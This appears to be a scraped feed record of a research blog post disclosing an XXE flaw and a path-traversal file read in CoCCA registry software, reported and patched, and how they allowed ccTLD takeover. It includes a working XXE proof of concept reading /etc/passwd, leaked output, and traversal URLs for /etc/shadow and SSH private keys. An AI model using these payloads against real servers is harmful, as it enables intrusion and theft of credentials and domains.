{
  "id": "eec621c5-50d9-4608-bc43-de159ff2603b",
  "title": "Hacking TLD EPP registry servers (2023)",
  "link": "https://hackcompute.com/hacking-epp-servers/",
  "description": "Article URL: https://hackcompute.com/hacking-epp-servers/ Comments URL: https://news.ycombinator.com/item?id=44372585 Points: 4 # Comments: 0",
  "author": "jesprenj",
  "published": "Wed, 25 Jun 2025 00:39:20 +0000",
  "source": "https://hnrss.org/frontpage",
  "categories": null,
  "byline": "hackcompute group",
  "length": 19146,
  "excerpt": "Finding vulnerabilities in global domain infrastructure to take control of ccTLD zones. Vulnerabilities in EPP",
  "siteName": "hackcompute",
  "favicon": "",
  "text": "Over the last few decades, the internet has been built upon specifications and protocols that often get forgotten about over time. Our research has often been focused on high impact targets (such as Web Hackers vs. The Auto Industry) and for the last few weeks, we decided to investigate the security of ccTLD/TLD registries around the world.Our efforts in this space led to the ability to control the DNS zones of the following ccTLDs: .ai, .bj, .bw, .ci, .gl, .ke, .kn, .lb, .ly, .mr, .ms, .mz, .ng, .py, .rw, .so, .ss, .td, .zm.This body of work was done by Sam Curry, Brett Buerhaus, Rhys Elsmore, and Shubham Shah.▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ \"What's a registry, registrar and EPP server?\" ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄When we speak about registries, we are referring to the highest level of the chain. The registries are responsible for managing every domain registered within their zone and facilitate important functionalities for the registrars that speak to them.Through hacking a registry, we ultimately gain control over every domain within their zone, regardless of which registrar was responsible for registering the domain.The registrar is the middle man between the consumer and the registry. When you purchase a domain from a registrar, they speak with the registry and register the domain you have purchased.EPP (Extensible Provision Protocol) defines a unified way for how registrars can communicate with registries of domain names by exchanging XML messages.EPP is typically implemented as an API between the registrar’s web interface and the Registry. Such integration allows the registrar to react immediately to requests from its clients and know for sure if the action succeeded or not. Should some action, such as registration of a domain name, to be put off until later, the registry will notify the registrar with the service message.EPP servers are arguably one of the most critical pieces of infrastructure in the world of domains.From this context, you can understand that a critical vulnerability that affects a registry or their EPP server, is basically game over.Gaining control over an entire root zone is not necessarily a new concept, however, historically, it has been executed through misconfigurations in DNS. [1] [2] [3]While taking over ccTLD's over DNS misconfigurations are cool, our focus was to take over entire zones through vulnerabilities that affect the underlying protocols and web applications that run registries on the internet. ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ \"Understanding the EPP protocol\" ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄EPP is quite simple actually. It runs on port 700 typically and all communication to the EPP server is done through XML over SSL/TLS. Registries are required to implement an EPP server so that registrars can speak to them and vice versa.While the protocol is quite simple, many registries make an effort to secure access to their EPP servers through the enforcement of mutual TLS or requiring certain certificates in your CA chain to be able to communicate with them. The 'mutual' in mutual TLS is not the same as client-side certificates.An example EPP message looks like the one below\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e \u003cepp xmlns=\"urn:ietf:params:xml:ns:epp-1.0\"\u003e\u003chello/\u003e\u003c/epp\u003eThe EPP protocol is vast, but almost all functionality is only unlocked after authenticating to the EPP server. This whole protocol gets easier to understand once you put yourselves in the shoes of a domain reseller that needs to perform administrative actions on domains that they own.They are able to connect to the registry EPP server, authenticate to it, and then make the relevant actions for domains they own (i.e. DNS transfer codes, updating WHOIS records). They should only be able to operate on the domains that are within their control.As per Wikipedia, the protocol has been adopted by a number of ccTLD domain name registries, such as: .ac, .ag, .ai, .as, .ar, .at, .au, .be, .br, .bz, .ca, .cat, .cc, .ch, .cl, .cn, .co, .cr, .cx, .cz, .dk, .dm, .ee, .es (over HTTPS), .eu, .fi, .fm, .fr, .gg, .gr (over HTTPS), .gs, .hn, .ht, .il, .im, .in, .io, .it (over HTTPS), .je, .ke, .ki, .ky, .kz, .la, .lc, .li, .lt, .lu, .lv, .md, .me, .mk, .mn, .ms, .mu, .mx, .na, .nf, .ng, .nl, .no, .nu, .nz (EPP codes referred to as UDAIs), .pe, .pk, .pl (over HTTPS), .ps, .pt, .ru, .ro, .sc, .se, .sh, .si, .su, .tl, .tm .tv, .tw, .ua, .uk, .us, .vc, .ve and .za as well as ENUM registries such as those operating the +31, +41, +43, +44 and +48 country codes.[9]▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ \"Attacking the EPP protocol\" ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄When hacking any system, you cannot make assumptions on its security posture as you will risk not testing certain vulnerability classes. Coming from the web application security angle, our immediate thoughts for targeting this protocol was testing for the presence of XML external entity injection.In order to do this, we modified a Python EPP client and crafted an XML payload in the correct format. This XML payload contained our XXE attack at the top. From scanning the internet and relying on passive data for IPs with port 700 open, we were able to amass a large list of EPP servers to attempt our research on.Our proof-of-concept was extremely effective:from epp import epp_client import sys ip = sys.argv[1] try: conn = epp_client.EPPConnection( host=ip, port=700, user='epp_user_01', password='some_secret', verbose=True, return_soup=True, ) conn.open() print(conn.call(\"\u003c?xml version=\\\"1.0\\\" standalone=\\\"no\\\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\"\u003e ]\u003e \u003cepp xmlns=\\\"urn:ietf:params:xml:ns:epp-1.0\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:schemaLocation=\\\"urn:ietf:params:xml:ns:epp-1.0 epp-1.0.xsd\\\"\u003e \u003ccommand\u003e \u003cpoll op='req' /\u003e \u003cclTRID\u003e\u0026xxe;\u003c/clTRID\u003e \u003c/command\u003e \u003c/epp\u003e\".format(ip))) except: print('failed lol')Running this on a vulnerable server yielded the following:\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\u003chtml\u003e\u003cbody\u003e\u003cepp xmlns=\"urn:ietf:params:xml:ns:epp-1.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemalocation=\"urn:ietf:params:xml:ns:epp-1.0 epp-1.0.xsd\"\u003e\u003cresponse\u003e\u003cresult code=\"2001\"\u003e\u003cmsg\u003eCommand syntax error\u003c/msg\u003e\u003cextvalue\u003e\u003cvalue xmlns:epp=\"urn:ietf:params:xml:ns:epp-1.0\"\u003e\u003cepp:undef\u003e\u003c/epp:undef\u003e\u003c/value\u003e\u003creason\u003eXML Parser: unknown-55ccdac19830:0: Schemas validity error : Element '{urn:ietf:params:xml:ns:epp-1.0}clTRID': [facet 'maxLength'] The value has a length of '1845'; this exceeds the allowed maximum length of '64'. unknown-55ccdac19830:0: Schemas validity error : Element '{urn:ietf:params:xml:ns:epp-1.0}clTRID': 'root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin sysadm:x:1000:1000:Unprivileged Administrator Account,,,:/home/sysadm:/bin/bash ansible:x:1001:1001:ansible user:/home/ansible:/bin/bash sssd:x:106:112:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin bareos:x:107:113:bareos,,,:/var/lib/bareos:/usr/sbin/nologin nagios:x:108:114::/var/lib/nagios:/usr/sbin/nologin stunnel4:x:109:115::/var/run/stunnel4:/usr/sbin/nologin ntp:x:110:116::/nonexistent:/usr/sbin/nologin _lldpd:x:111:117::/var/run/lldpd:/usr/sbin/nologin postfix:x:112:119::/var/spool/postfix:/usr/sbin/nologin ' is not a valid value of the atomic type '{urn:ietf:params:xml:ns:epp-1.0}trIDStringType'. \u003c/reason\u003e\u003c/extvalue\u003e\u003c/result\u003e\u003ctrid\u003e\u003csvtrid\u003eRO-549-1682827377068386\u003c/svtrid\u003e\u003c/trid\u003e\u003c/response\u003e\u003c/epp\u003eSurprisingly, we saw a large number of EPP servers vulnerable to this simple XXE attack. We received over 50 callbacks to our Burp Collaborator server, and in the process of investigating these, we started to see a pattern. Most of the EPP servers that were vulnerable to this were running a registry software named CoCCA Registry Software.This software allows registries to bootstrap their operations and provides all the functionalities needed for them to operate a TLD/ccTLD. This software has been instrumental in the proliferation of smaller ccTLDs as they often do not have the resources to build all of these functionalities themselves.Often, ccTLDs are managed by small teams and sometimes this work is outsourced to Universities or private individuals. We sometimes do not recognize the sparseness of resources when it comes to our global internet infrastructure. ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ \"Exploring the CoCCA Registry Software\" ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄The registry software includes a web application that is used to manage the registry, as well as an in-built EPP server where we discovered our XXE in. This application is written purely in Java, backed by a Postgres database.We were quickly able to identify the root cause of the XXE when looking at the EppConnection.java class, which initialised an XML reader through the following code:/* */ public EppConnection() { /* */ try { /* 106 */ DocumentBuilderFactory dFactory = DocumentBuilderFactory.newInstance(); /* 107 */ dFactory.setNamespaceAware(true); /* 108 */ dFactory.setIgnoringElementContentWhitespace(true); /* 109 */ this.dBuilder = dFactory.newDocumentBuilder(); /* */ /* 111 */ TransformerFactory tFactory = TransformerFactory.newInstance(); /* 112 */ this.transformer = tFactory.newTransformer(); /* 113 */ this.transformer.setOutputProperty(\"encoding\", \"UTF-8\"); /* 114 */ } catch (ParserConfigurationException e) { /* 115 */ e.printStackTrace(System.out); /* 116 */ } catch (TransformerConfigurationException e) { /* 117 */ e.printStackTrace(System.out); /* */ } /* */ }As you can see above, the document builder factory that is used for all XML processing has not been set up to ignore external entities or DTDs. Due to this, any XML processing done by the in-built EPP server was vulnerable to XXE.The below XXE payload will successfully fire when the EPP server processes our XML:\u003c?xml version=\"1.0\" standalone=\"no\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u003cepp xmlns=\"urn:ietf:params:xml:ns:epp-1.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"urn:ietf:params:xml:ns:epp-1.0 epp-1.0.xsd\"\u003e \u003ccommand\u003e \u003cpoll op='req' /\u003e \u003cclTRID\u003e\u0026xxe;\u003c/clTRID\u003e \u003c/command\u003e \u003c/epp\u003eThis example was also utilized in our simple checker script above in this blog post, and the SYSTEM entity can be changed to a Burp Collaborator URL to capture out of bound hits.While the XXE was an impactful finding, we became curious about the security posture of this registry software as it is used so heavily to operate a significant portion of the internet as we know it.Checking the web.xml file, we started mapping out pre-authentication routes until we came across the following servlet definition: \u003c!-- Cities servlet for contact create --\u003e \u003cservlet\u003e \u003cservlet-name\u003eCitiesServlet\u003c/servlet-name\u003e \u003cservlet-class\u003ecx.cocca.utils.CitiesServlet \u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003curl-pattern\u003e/cities\u003c/url-pattern\u003e \u003cservlet-name\u003eCitiesServlet\u003c/servlet-name\u003e \u003c/servlet-mapping\u003eThe code for this servlet contained a local file disclosure vulnerability:public class CitiesServlet extends HttpServlet { private static final Log log = LogFactoryImpl.getLog(cx.cocca.utils.CitiesServlet.class); private static final String FILE = \"/cities/cities_\"; protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String country = req.getParameter(\"country\"); String fileName = \"/cities/cities_\" + country; log.debug(\"File name is \" + fileName); try (InputStream is = getClass().getResourceAsStream(fileName)) { StringBuilder sb = new StringBuilder(\"{\\\"cities\\\": [\"); if (is != null) { List\u003cString\u003e cities = IOUtils.readLines(is, \"UTF-8\"); boolean first = true; for (String city : cities) { if (!first) sb.append(\", \"); sb.append(\"\\\"\"); sb.append(city); sb.append(\"\\\"\"); first = false; } } sb.append(\"]}\"); resp.setContentType(\"application/json\"); resp.getWriter().println(sb.toString()); } catch (Exception e) { log.error(\"Error loading cities\", e); } } }We were able to chain the XXE vulnerability with this local file disclosure vulnerability to obtain any file on the local system. The XXE provided us the ability to understand the file and folder structure of the underlying system and this local file disclosure vulnerability let us easily and cleanly download any file on the system. The XXE can also be used to exfiltrate files, and through the FTP trick, it is possible to obtain files that contain new lines or control characters.Given that we could access the /etc/shadow file on most servers running this software, it was clear to us that we could access any file on the filesystem, and the application was probably running as root (!!). ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ \"Proving Impact\" ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄Now that we've established the ground work to be able to compromise servers running the CoCCA registry software, how much damage could an attacker really do?For the purposes of proving the impact, and given the rise of AI, we focused our efforts on the .AI ccTLD. The following files were able to be obtained through the vulnerabilities we discovered:https://epp.whois.ai/cities?country=/../../../../../../../../etc/shadow https://epp.whois.ai/cities?country=/../../../../../../../../home/vince/.ssh/known_hosts https://epp.whois.ai/cities?country=/../../../../../../../../opt/resin/log/oteaccess.log https://epp.whois.ai/cities?country=/../../../../../../../../home/garth_cocca/.bash_history https://epp.whois.ai/cities?country=/../../../../../../../../opt/resin/conf/resin.xml https://epp.whois.ai/cities?country=/../../../../../../../../root/.psql_history https://epp.whois.ai/cities?country=/../../../../../../../../home/vince/.ssh/id_rsaWe discovered that one of the maintainers of the .AI registry is a person named Vince. Given that the files obtained via this vulnerability gave us his SSH private key, we validated that we could login to his server, which contained several GPG encrypted backups of the entire .AI registry.We got in touch with Vince, and he thankfully put us in touch with the relevant people as well as acted diligently in resolving the vulnerabilities on his systems. Temporarily taking them offline while a fix was made available.Speaking with Vince (the administrator of the .ai zone) over WhatsApp, we confirmed that compromising this server would give us full control over any .ai domain:The impact unfortunately does not stop there, in the process of reading files from various registry servers running CoCCA, we discovered a file called upload-files-box-com.sh.As the filename suggests, this script was responsible for taking a full database backup and uploading them to a central box.com account. We validated that these credentials were valid and led to the ability to compromise almost every major ccTLD that was running the CoCCA application:Oh no....These database backups are essentially game over. Once administrative access is gained to the CoCCA application, it is possible to control the nameservers for every domain for that ccTLD. Additional impact included the ability to transfer domains that don't belong to you.All of this was communicated to the affected parties and all of the EPP servers running the CoCCA software that were managed by this central entity have been patched. Whether or not they are still uploading all the database backups to a central box.com account is unknown, but it is clear that the internet is so, so brittle.The latest version of the CoCCA software contains patches for all of the vulnerabilities we discovered.▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ \"Future Work\" ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄While we looked at CoCCA in detail, there are two other major registry software that we are aware of where the source code has been made available.Nomulus, registry software created and used by Google. You can find this software in production, here: domain-registry.appspot.comFortunately, Google's defensive programming, prevented them from being vulnerable to XXE via EPP messages: private static XMLInputFactory createInputFactory() throws FactoryConfigurationError { // Prevent XXE attacks. XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory(); xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false); return xmlInputFactory; } We spent a significant amount of time on Google's registry software and discovered an endpoint that we believe are not supposed to be accessed without authentication, but given that we couldn't prove much security impact, it was not reported to Google.Another registry software that could be a great research target is Fred, which is managed by the team at nic.cz. It is being used by a lot of different registries, and any pre-authentication vulnerability in this could be critical to the domain infrastructure for the following ccTLDs:▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ \"Closing Notes\" ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄We thank the CoCCA team for fixing all the issues we identified, Vince from nic.ai, and Mike Damm from Zuffix Domains.",
  "image": "",
  "html": "\u003cdiv id=\"readability-page-1\" class=\"page\"\u003e\u003cdiv id=\"content\"\u003e\n\n  \u003carticle\u003e\n\n\n      \n\n      \u003csection\u003e\n        \u003cp\u003eOver the last few decades, the internet has been built upon specifications and protocols that often get forgotten about over time. Our research has often been focused on high impact targets (such as \u003ca href=\"https://samcurry.net/web-hackers-vs-the-auto-industry/\"\u003eWeb Hackers vs. The Auto Industry\u003c/a\u003e) and for the last few weeks, we decided to investigate the security of ccTLD/TLD registries around the world.\u003c/p\u003e\u003cp\u003eOur efforts in this space led to the ability to control the DNS zones of the following ccTLDs: .ai, .bj, .bw, .ci, .gl, .ke, .kn, .lb, .ly, .mr, .ms, .mz, .ng, .py, .rw, .so, .ss, .td, .zm.\u003c/p\u003e\u003cp\u003eThis body of work was done by \u003ca href=\"https://twitter.com/samwcyo\"\u003eSam Curry\u003c/a\u003e, \u003ca href=\"https://twitter.com/bbuerhaus\"\u003eBrett Buerhaus\u003c/a\u003e, \u003ca href=\"https://twitter.com/rhyselsmore\"\u003eRhys Elsmore\u003c/a\u003e, and \u003ca href=\"https://twitter.com/infosec_au\"\u003eShubham Shah\u003c/a\u003e.\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n\u0026#34;What\u0026#39;s a registry, registrar and EPP server?\u0026#34;\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWhen we speak about registries, we are referring to the highest level of the chain. The registries are responsible for managing every domain registered within their zone and facilitate important functionalities for the registrars that speak to them.\u003c/p\u003e\u003cp\u003eThrough hacking a registry, we ultimately gain control over every domain within their zone, regardless of which registrar was responsible for registering the domain.\u003c/p\u003e\u003cp\u003eThe registrar is the middle man between the consumer and the registry. When you purchase a domain from a registrar, they speak with the registry and register the domain you have purchased.\u003c/p\u003e\u003cp\u003eEPP (Extensible Provision Protocol) defines a unified way for how registrars can communicate with registries of domain names by exchanging XML messages.\u003c/p\u003e\u003cp\u003eEPP is typically implemented as an API between the registrar’s web interface and the Registry. Such integration allows the registrar to react immediately to requests from its clients and know for sure if the action succeeded or not. Should some action, such as registration of a domain name, to be put off until later, the registry will notify the registrar with the service message.\u003c/p\u003e\u003cp\u003eEPP servers are arguably one of the most critical pieces of infrastructure in the world of domains.\u003c/p\u003e\u003cp\u003eFrom this context, you can understand that a critical vulnerability that affects a registry or their EPP server, is basically game over.\u003c/p\u003e\u003cp\u003eGaining control over an entire root zone is not necessarily a new concept, however, historically, it has been executed through misconfigurations in DNS. \u003ca href=\"https://labs.detectify.com/2021/01/15/how-i-hijacked-the-top-level-domain-of-a-sovereign-state/\"\u003e[1]\u003c/a\u003e \u003ca href=\"https://thehackerblog.com/the-journey-to-hijacking-a-countrys-tld-the-hidden-risks-of-domain-extensions/\"\u003e[2]\u003c/a\u003e \u003ca href=\"https://thehackerblog.com/the-io-error-taking-control-of-all-io-domains-with-a-targeted-registration/\"\u003e[3]\u003c/a\u003e\u003c/p\u003e\u003cp\u003eWhile taking over ccTLD\u0026#39;s over DNS misconfigurations are cool, our focus was to take over entire zones through vulnerabilities that affect the underlying protocols and web applications that run registries on the internet. \u003c/p\u003e\u003cpre\u003e\u003ccode\u003e▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n\u0026#34;Understanding the EPP protocol\u0026#34;\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eEPP is quite simple actually. It runs on port \u003ccode\u003e700\u003c/code\u003e typically and all communication to the EPP server is done through XML over SSL/TLS. Registries are required to implement an EPP server so that registrars can speak to them and vice versa.\u003c/p\u003e\u003cp\u003eWhile the protocol is quite simple, many registries make an effort to secure access to their EPP servers through the enforcement of mutual TLS or requiring certain certificates in your CA chain to be able to communicate with them. The \u0026#39;mutual\u0026#39; in mutual TLS is not the same as client-side certificates.\u003c/p\u003e\u003cp\u003eAn example EPP message looks like the one below\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt;\n\u0026lt;epp xmlns=\u0026#34;urn:ietf:params:xml:ns:epp-1.0\u0026#34;\u0026gt;\u0026lt;hello/\u0026gt;\u0026lt;/epp\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThe EPP protocol is vast, but almost all functionality is only unlocked after authenticating to the EPP server. This whole protocol gets easier to understand once you put yourselves in the shoes of a domain reseller that needs to perform administrative actions on domains that they own.\u003c/p\u003e\u003cp\u003eThey are able to connect to the registry EPP server, authenticate to it, and then make the relevant actions for domains they own (i.e. DNS transfer codes, updating WHOIS records). They should only be able to operate on the domains that are within their control.\u003c/p\u003e\u003cp\u003eAs per Wikipedia, the protocol has been adopted by a number of ccTLD domain name registries, such as: \u003ca href=\"https://en.wikipedia.org/wiki/.ac\"\u003e.ac\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ag\"\u003e.ag\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ai\"\u003e.ai\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.as\"\u003e.as\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ar\"\u003e.ar\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.at\"\u003e.at\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.au\"\u003e.au\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.be\"\u003e.be\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.br\"\u003e.br\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.bz\"\u003e.bz\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ca\"\u003e.ca\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.cat\"\u003e.cat\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.cc\"\u003e.cc\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ch\"\u003e.ch\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.cl\"\u003e.cl\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.cn\"\u003e.cn\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.co\"\u003e.co\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.cr\"\u003e.cr\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.cx\"\u003e.cx\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.cz\"\u003e.cz\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.dk\"\u003e.dk\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.dm\"\u003e.dm\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ee\"\u003e.ee\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.es\"\u003e.es\u003c/a\u003e (over HTTPS), \u003ca href=\"https://en.wikipedia.org/wiki/.eu\"\u003e.eu\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.fi\"\u003e.fi\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.fm\"\u003e.fm\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.fr\"\u003e.fr\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.gg\"\u003e.gg\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.gr\"\u003e.gr\u003c/a\u003e (over HTTPS), \u003ca href=\"https://en.wikipedia.org/wiki/.gs\"\u003e.gs\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.hn\"\u003e.hn\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ht\"\u003e.ht\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.il\"\u003e.il\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.im\"\u003e.im\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.in\"\u003e.in\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.io\"\u003e.io\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.it\"\u003e.it\u003c/a\u003e (over HTTPS), \u003ca href=\"https://en.wikipedia.org/wiki/.je\"\u003e.je\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ke\"\u003e.ke\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ki\"\u003e.ki\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.ky\"\u003e.ky\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.kz\"\u003e.kz\u003c/a\u003e, \u003ca href=\"https://en.wikipedia.org/wiki/.la\"\u003e.la\u003c/a\u003e, \u003ca 